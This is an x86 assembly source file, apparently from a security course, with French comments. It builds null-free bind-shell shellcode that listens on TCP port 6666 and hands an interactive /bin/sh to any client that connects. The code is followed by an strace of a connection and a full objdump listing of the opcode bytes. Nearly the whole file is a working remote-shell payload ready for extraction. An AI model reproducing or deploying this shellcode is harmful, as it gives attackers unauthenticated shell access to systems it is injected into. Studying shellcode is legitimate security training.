.section .text
.global _start

socketcall:
    push %ebp
    mov %esp, %ebp

    push %eax
    push %ebx
    push %ecx

    xor %eax, %eax
    mov $0x66, %al
    mov 8(%ebp), %ebx
    mov 12(%ebp), %ecx
    int $0x80

    # save return value in edx temporarily
    mov %eax, %edx

    pop %ecx
    pop %ebx
    pop %eax

    # set return value
    mov %edx, %eax

    mov %ebp, %esp
    pop %ebp
    ret

_start:
    # socket_param
    sub $12, %esp

    xor %eax, %eax
    add $2, %al
    mov %eax, (%esp)     # replace movl $2, 0(%esp)

    xor %eax, %eax
    add $1, %al
    mov %eax, 4(%esp)    # replace movl $1, 4(%esp)

    xor %eax, %eax
    add $6, %al
    mov %eax, 8(%esp)    # replace movl $6, 8(%esp)

    # soc = socketcall(1, socket_param)
    mov %esp, %eax       # socket_param address
    push %eax

    xor %eax, %eax
    add $1, %al
    push %eax            # replace push $1

    call socketcall

    xor %ecx, %ecx
    add $8, %cl
    add %ecx, %esp       # replace add $8, %esp

    mov %eax, %edi      # save soc in %edi

    xor %ecx, %ecx
    add $12, %cl
    add %ecx, %esp       # replace add $12, %esp (free socket_param)

    # serv_addr
    xor %eax, %eax
    add $16, %al
    sub %eax, %esp       # replace sub $16, %esp

    # 2, 0 (AF_INET)
    xor %eax, %eax
    add $2, %al
    mov %al, (%esp)      # 2
    xor %al, %al
    mov %al, 1(%esp)     # 0

    # htons(6666) = 0x0a1a
    mov $0x1a, %al
    mov %al, 2(%esp)
    mov $0x0a, %al
    mov %al, 3(%esp)

    # 0x00 * 16
    xor %eax, %eax
    mov %eax, 4(%esp)
    mov %eax, 8(%esp)
    mov %eax, 12(%esp)

    # bind_param [soc, &serv_addr, 16]
    xor %eax, %eax
    add $12, %al
    sub %eax, %esp       # replace sub $12, %esp

    mov %edi, (%esp)     # soc

    lea 12(%esp), %eax
    mov %eax, 4(%esp)

    xor %eax, %eax
    add $16, %al
    mov %eax, 8(%esp)

    # socketcall(2, bind_param)
    mov %esp, %eax       # &bind_param
    push %eax

    xor %eax, %eax
    add $2, %al
    push %eax

    call socketcall

    xor %edx, %edx
    add $8, %dl
    add %edx, %esp       # replace add $8, %esp (free socketcall args)

    xor %edx, %edx
    add $12, %dl
    add %edx, %esp       # replace add $12, %esp (free bind_param)

    xor %edx, %edx
    add $16, %dl
    add %edx, %esp       # replace add $16, %esp (free serv_addr)

    # listen_param [soc, 1]
    xor %eax, %eax
    add $8, %al
    sub %eax, %esp       # replace sub $8, %esp

    mov %edi, (%esp)     # soc

    xor %eax, %eax
    add $1, %eax
    mov %eax, 4(%esp)    # replacce movl $1, 4(%esp)

    # socketcall(4, listen_param)
    mov %esp, %eax       # &listen_param
    push %eax

    xor %eax, %eax
    add $4, %al
    push %eax            # replace push $4

    call socketcall

    xor %edx, %edx
    add $8, %dl
    add %edx, %esp       # replace add $8, %esp (free socketcall args)

    xor %edx, %edx
    add $8, %dl
    add %edx, %esp       # replace add $8, %esp (free listen_param)

    # accept_param [soc, NULL, NULL]
    xor %eax, %eax
    add $12, %al
    sub %eax, %esp       # replace sub $12, %esp

    mov %edi, (%esp)     # soc
    xor %eax, %eax
    mov %eax, 4(%esp)    # replace movl $0, 4(%esp)
    mov %eax, 8(%esp)    # replace movl $0, 8(%esp)

    # soc = socketcall(5, accept_param)
    mov %esp, %eax       # &accept_param
    push %eax

    xor %eax, %eax
    add $5, %al
    push %eax            # replace push $5

    call socketcall

    xor %edx, %edx
    add $8, %dl
    add %edx, %esp       # replace add $8, %esp (free socketcall args)

    mov %eax, %edi

    xor %edx, %edx
    add $12, %dl
    add %edx, %esp       # replace add $8, %esp (free accept_param)

    # dup2(soc, 0)
    xor %eax, %eax
    mov $0x3f, %al       # 63
    mov %edi, %ebx       # soc
    xor %ecx, %ecx       # 0
    int $0x80

    # dup2(soc, 1)
    xor %eax, %eax
    mov $0x3f, %al
    mov %edi, %ebx
    xor %ecx, %ecx
    add $1, %ecx         # replace mov $1, %ecx
    int $0x80

    # dup2(soc, 2)
    xor %eax, %eax
    mov $0x3f, %al
    mov %edi, %ebx
    xor %ecx, %ecx
    add $2, %cl          # replace mov $2, %ecx
    int $0x80

    # execve("/bin/sh", ["/bin/sh", "-i", NULL], NULL)
    # "/bin/sh\0"
    xor %eax, %eax
    push %eax            # \0
    push $0x68732f2f     # "//sh"
    push $0x6e69622f     # "/bin"
    mov %esp, %ebx

    # "-i\0"
    xor %eax, %eax
    push %eax
    mov $0x692d, %ax
    push %eax            # replace push $0x692d
    mov %esp, %esi

    # fill argv[]
    xor %eax, %eax
    push %eax            # NULL
    push %esi            # "-i"
    push %ebx            # "/bin/sh"
    mov %esp, %ecx

    # execve
    xor %edx, %edx
    xor %eax, %eax
    mov $0x0b, %al     # 11 (execve syscall)
    int $0x80

    # exit(0)
    xor %eax, %eax
    add $1, %eax           # replace mov $1, %eax
    xor %ebx, %ebx
    int $0x80


/* Trace strace avec connexion client :
execve("./bind3", ["./bind3"], 0xbfe0c460 /* 42 vars */) = 0
socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
bind(3, {sa_family=AF_INET, sin_port=htons(6666), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
listen(3, 1)                            = 0
accept(3, NULL, NULL)                   = 4
dup2(4, 0)                              = 0
dup2(4, 1)                              = 1
dup2(4, 2)                              = 2
execve("/bin//sh", ["/bin//sh", "-i"], NULL) = 0
brk(NULL)                               = 0x1676000
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fac000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 5
statx(5, "", AT_STATX_SYNC_AS_STAT|AT_NO_AUTOMOUNT|AT_EMPTY_PATH, STATX_BASIC_STATS, {stx_mask=STATX_BASIC_STATS|STATX_MNT_ID, stx_attributes=0, stx_mode=S_IFREG|0644, stx_size=71814, ...}) = 0
mmap2(NULL, 71814, PROT_READ, MAP_PRIVATE, 5, 0) = 0xb7f9a000
close(5)                                = 0
openat(AT_FDCWD, "/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 5
read(5, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0205\2\0004\0\0\0"..., 512) = 512
statx(5, "", AT_STATX_SYNC_AS_STAT|AT_NO_AUTOMOUNT|AT_EMPTY_PATH, STATX_BASIC_STATS, {stx_mask=STATX_BASIC_STATS|STATX_MNT_ID, stx_attributes=0, stx_mode=S_IFREG|0755, stx_size=2225200, ...}) = 0
mmap2(NULL, 2259228, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7d72000
mmap2(0xb7d94000, 1544192, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x22000) = 0xb7d94000
mmap2(0xb7f0d000, 524288, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x19b000) = 0xb7f0d000
mmap2(0xb7f8d000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x21b000) = 0xb7f8d000
mmap2(0xb7f90000, 39196, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f90000
close(5)                                = 0
set_thread_area({entry_number=-1, base_addr=0xb7fad600, limit=0x0fffff, seg_32bit=1, contents=0, read_exec_only=0, limit_in_pages=1, seg_not_present=0, useable=1}) = 0 (entry_number=6)
set_tid_address(0xb7fad668)             = 2955
set_robust_list(0xb7fad66c, 12)         = 0
rseq(0xb7fadaa0, 0x20, 0, 0x53053053)   = 0
mprotect(0xb7f8d000, 8192, PROT_READ)   = 0
mprotect(0x495000, 4096, PROT_READ)     = 0
mprotect(0xb7fe6000, 8192, PROT_READ)   = 0
ugetrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
munmap(0xb7f9a000, 71814)               = 0
getuid32()                              = 1000
getgid32()                              = 1000
getpid()                                = 2955
rt_sigaction(SIGCHLD, {sa_handler=0x486df0, sa_mask=~[RTMIN RT_1], sa_flags=0}, NULL, 8) = 0
geteuid32()                             = 1000
getppid()                               = 2952
getrandom("\x35\x83\xbf\xc8", 4, GRND_NONBLOCK) = 4
brk(NULL)                               = 0x1676000
brk(0x1697000)                          = 0x1697000
brk(0x1698000)                          = 0x1698000
getcwd("/home/paul/TATT/DM", 4096)      = 19
brk(0x1697000)                          = 0x1697000
geteuid32()                             = 1000
getegid32()                             = 1000
rt_sigaction(SIGINT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGINT, {sa_handler=0x486df0, sa_mask=~[RTMIN RT_1], sa_flags=0}, NULL, 8) = 0
rt_sigaction(SIGQUIT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGQUIT, {sa_handler=SIG_IGN, sa_mask=~[RTMIN RT_1], sa_flags=0}, NULL, 8) = 0
rt_sigaction(SIGTERM, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGTERM, {sa_handler=SIG_IGN, sa_mask=~[RTMIN RT_1], sa_flags=0}, NULL, 8) = 0
openat(AT_FDCWD, "/dev/tty", O_RDWR|O_LARGEFILE) = 5
fcntl64(5, F_DUPFD, 10)                 = 10
close(5)                                = 0
fcntl64(10, F_SETFD, FD_CLOEXEC)        = 0
ioctl(10, TIOCGPGRP, [2952])            = 0
getpgrp()                               = 2952
rt_sigaction(SIGTSTP, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGTSTP, {sa_handler=SIG_IGN, sa_mask=~[RTMIN RT_1], sa_flags=0}, NULL, 8) = 0
rt_sigaction(SIGTTOU, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGTTOU, {sa_handler=SIG_IGN, sa_mask=~[RTMIN RT_1], sa_flags=0}, NULL, 8) = 0
rt_sigaction(SIGTTIN, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=0}, NULL, 8) = 0
setpgid(0, 2955)                        = 0
rt_sigprocmask(SIG_SETMASK, ~[RTMIN RT_1], NULL, 8) = 0
ioctl(10, TIOCSPGRP, [2955])            = 0
rt_sigprocmask(SIG_SETMASK, [], ~[KILL STOP RTMIN RT_1], 8) = 0
write(2, "$ ", 2)                       = 2
read(0, "", 8192)                       = 0
write(2, "\n", 1)                       = 1
rt_sigprocmask(SIG_SETMASK, ~[RTMIN RT_1], NULL, 8) = 0
ioctl(10, TIOCSPGRP, [2952])            = 0
rt_sigprocmask(SIG_SETMASK, [], ~[KILL STOP RTMIN RT_1], 8) = 0
setpgid(0, 2952)                        = 0
close(10)                               = 0
exit_group(0)                           = ?
+++ exited with 0 +++
*/

/* objdump -d sur le binaire final :

bind3:     file format elf32-i386


Disassembly of section .text:

08049000 <socketcall>:
 8049000:	55                   	push   %ebp
 8049001:	89 e5                	mov    %esp,%ebp
 8049003:	50                   	push   %eax
 8049004:	53                   	push   %ebx
 8049005:	51                   	push   %ecx
 8049006:	31 c0                	xor    %eax,%eax
 8049008:	b0 66                	mov    $0x66,%al
 804900a:	8b 5d 08             	mov    0x8(%ebp),%ebx
 804900d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
 8049010:	cd 80                	int    $0x80
 8049012:	89 c2                	mov    %eax,%edx
 8049014:	59                   	pop    %ecx
 8049015:	5b                   	pop    %ebx
 8049016:	58                   	pop    %eax
 8049017:	89 d0                	mov    %edx,%eax
 8049019:	89 ec                	mov    %ebp,%esp
 804901b:	5d                   	pop    %ebp
 804901c:	c3                   	ret

0804901d <_start>:
 804901d:	83 ec 0c             	sub    $0xc,%esp
 8049020:	31 c0                	xor    %eax,%eax
 8049022:	04 02                	add    $0x2,%al
 8049024:	89 04 24             	mov    %eax,(%esp)
 8049027:	31 c0                	xor    %eax,%eax
 8049029:	04 01                	add    $0x1,%al
 804902b:	89 44 24 04          	mov    %eax,0x4(%esp)
 804902f:	31 c0                	xor    %eax,%eax
 8049031:	04 06                	add    $0x6,%al
 8049033:	89 44 24 08          	mov    %eax,0x8(%esp)
 8049037:	89 e0                	mov    %esp,%eax
 8049039:	50                   	push   %eax
 804903a:	31 c0                	xor    %eax,%eax
 804903c:	04 01                	add    $0x1,%al
 804903e:	50                   	push   %eax
 804903f:	e8 bc ff ff ff       	call   8049000 <socketcall>
 8049044:	31 c9                	xor    %ecx,%ecx
 8049046:	80 c1 08             	add    $0x8,%cl
 8049049:	01 cc                	add    %ecx,%esp
 804904b:	89 c7                	mov    %eax,%edi
 804904d:	31 c9                	xor    %ecx,%ecx
 804904f:	80 c1 0c             	add    $0xc,%cl
 8049052:	01 cc                	add    %ecx,%esp
 8049054:	31 c0                	xor    %eax,%eax
 8049056:	04 10                	add    $0x10,%al
 8049058:	29 c4                	sub    %eax,%esp
 804905a:	31 c0                	xor    %eax,%eax
 804905c:	04 02                	add    $0x2,%al
 804905e:	88 04 24             	mov    %al,(%esp)
 8049061:	30 c0                	xor    %al,%al
 8049063:	88 44 24 01          	mov    %al,0x1(%esp)
 8049067:	b0 1a                	mov    $0x1a,%al
 8049069:	88 44 24 02          	mov    %al,0x2(%esp)
 804906d:	b0 0a                	mov    $0xa,%al
 804906f:	88 44 24 03          	mov    %al,0x3(%esp)
 8049073:	31 c0                	xor    %eax,%eax
 8049075:	89 44 24 04          	mov    %eax,0x4(%esp)
 8049079:	89 44 24 08          	mov    %eax,0x8(%esp)
 804907d:	89 44 24 0c          	mov    %eax,0xc(%esp)
 8049081:	31 c0                	xor    %eax,%eax
 8049083:	04 0c                	add    $0xc,%al
 8049085:	29 c4                	sub    %eax,%esp
 8049087:	89 3c 24             	mov    %edi,(%esp)
 804908a:	8d 44 24 0c          	lea    0xc(%esp),%eax
 804908e:	89 44 24 04          	mov    %eax,0x4(%esp)
 8049092:	31 c0                	xor    %eax,%eax
 8049094:	04 10                	add    $0x10,%al
 8049096:	89 44 24 08          	mov    %eax,0x8(%esp)
 804909a:	89 e0                	mov    %esp,%eax
 804909c:	50                   	push   %eax
 804909d:	31 c0                	xor    %eax,%eax
 804909f:	04 02                	add    $0x2,%al
 80490a1:	50                   	push   %eax
 80490a2:	e8 59 ff ff ff       	call   8049000 <socketcall>
 80490a7:	31 d2                	xor    %edx,%edx
 80490a9:	80 c2 08             	add    $0x8,%dl
 80490ac:	01 d4                	add    %edx,%esp
 80490ae:	31 d2                	xor    %edx,%edx
 80490b0:	80 c2 0c             	add    $0xc,%dl
 80490b3:	01 d4                	add    %edx,%esp
 80490b5:	31 d2                	xor    %edx,%edx
 80490b7:	80 c2 10             	add    $0x10,%dl
 80490ba:	01 d4                	add    %edx,%esp
 80490bc:	31 c0                	xor    %eax,%eax
 80490be:	04 08                	add    $0x8,%al
 80490c0:	29 c4                	sub    %eax,%esp
 80490c2:	89 3c 24             	mov    %edi,(%esp)
 80490c5:	31 c0                	xor    %eax,%eax
 80490c7:	83 c0 01             	add    $0x1,%eax
 80490ca:	89 44 24 04          	mov    %eax,0x4(%esp)
 80490ce:	89 e0                	mov    %esp,%eax
 80490d0:	50                   	push   %eax
 80490d1:	31 c0                	xor    %eax,%eax
 80490d3:	04 04                	add    $0x4,%al
 80490d5:	50                   	push   %eax
 80490d6:	e8 25 ff ff ff       	call   8049000 <socketcall>
 80490db:	31 d2                	xor    %edx,%edx
 80490dd:	80 c2 08             	add    $0x8,%dl
 80490e0:	01 d4                	add    %edx,%esp
 80490e2:	31 d2                	xor    %edx,%edx
 80490e4:	80 c2 08             	add    $0x8,%dl
 80490e7:	01 d4                	add    %edx,%esp
 80490e9:	31 c0                	xor    %eax,%eax
 80490eb:	04 0c                	add    $0xc,%al
 80490ed:	29 c4                	sub    %eax,%esp
 80490ef:	89 3c 24             	mov    %edi,(%esp)
 80490f2:	31 c0                	xor    %eax,%eax
 80490f4:	89 44 24 04          	mov    %eax,0x4(%esp)
 80490f8:	89 44 24 08          	mov    %eax,0x8(%esp)
 80490fc:	89 e0                	mov    %esp,%eax
 80490fe:	50                   	push   %eax
 80490ff:	31 c0                	xor    %eax,%eax
 8049101:	04 05                	add    $0x5,%al
 8049103:	50                   	push   %eax
 8049104:	e8 f7 fe ff ff       	call   8049000 <socketcall>
 8049109:	31 d2                	xor    %edx,%edx
 804910b:	80 c2 08             	add    $0x8,%dl
 804910e:	01 d4                	add    %edx,%esp
 8049110:	89 c7                	mov    %eax,%edi
 8049112:	31 d2                	xor    %edx,%edx
 8049114:	80 c2 0c             	add    $0xc,%dl
 8049117:	01 d4                	add    %edx,%esp
 8049119:	31 c0                	xor    %eax,%eax
 804911b:	b0 3f                	mov    $0x3f,%al
 804911d:	89 fb                	mov    %edi,%ebx
 804911f:	31 c9                	xor    %ecx,%ecx
 8049121:	cd 80                	int    $0x80
 8049123:	31 c0                	xor    %eax,%eax
 8049125:	b0 3f                	mov    $0x3f,%al
 8049127:	89 fb                	mov    %edi,%ebx
 8049129:	31 c9                	xor    %ecx,%ecx
 804912b:	83 c1 01             	add    $0x1,%ecx
 804912e:	cd 80                	int    $0x80
 8049130:	31 c0                	xor    %eax,%eax
 8049132:	b0 3f                	mov    $0x3f,%al
 8049134:	89 fb                	mov    %edi,%ebx
 8049136:	31 c9                	xor    %ecx,%ecx
 8049138:	80 c1 02             	add    $0x2,%cl
 804913b:	cd 80                	int    $0x80
 804913d:	31 c0                	xor    %eax,%eax
 804913f:	50                   	push   %eax
 8049140:	68 2f 2f 73 68       	push   $0x68732f2f
 8049145:	68 2f 62 69 6e       	push   $0x6e69622f
 804914a:	89 e3                	mov    %esp,%ebx
 804914c:	31 c0                	xor    %eax,%eax
 804914e:	50                   	push   %eax
 804914f:	66 b8 2d 69          	mov    $0x692d,%ax
 8049153:	50                   	push   %eax
 8049154:	89 e6                	mov    %esp,%esi
 8049156:	31 c0                	xor    %eax,%eax
 8049158:	50                   	push   %eax
 8049159:	56                   	push   %esi
 804915a:	53                   	push   %ebx
 804915b:	89 e1                	mov    %esp,%ecx
 804915d:	31 d2                	xor    %edx,%edx
 804915f:	31 c0                	xor    %eax,%eax
 8049161:	b0 0b                	mov    $0xb,%al
 8049163:	cd 80                	int    $0x80
 8049165:	31 c0                	xor    %eax,%eax
 8049167:	83 c0 01             	add    $0x1,%eax
 804916a:	31 db                	xor    %ebx,%ebx
 804916c:	cd 80                	int    $0x80
*/
